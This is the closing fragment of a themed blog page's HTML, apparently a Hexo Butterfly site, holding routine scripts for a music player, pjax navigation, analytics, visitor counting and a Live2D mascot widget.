    getScript('https://cdn.jsdelivr.net/npm/typed.js/lib/typed.min.js').then(subtitleType)
  }
} else {
  subtitleType()
}</script></div><script src="/js/snowflake.js"></script><div class="aplayer no-destroy" data-id="2276118625" data-server="netease" data-type="playlist" data-fixed="true"  data-mini="playlist" data-autoplay="true"> </div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["link[rel=\"canonical\"]","meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":true,"model":{"jsonPath":"/live2dw/assets/ots14_3001.model.json"},"display":{"position":"right","width":350,"height":400,"hOffset":-50,"vOffset":0},"mobile":{"show":false},"log":false});</script></body></html>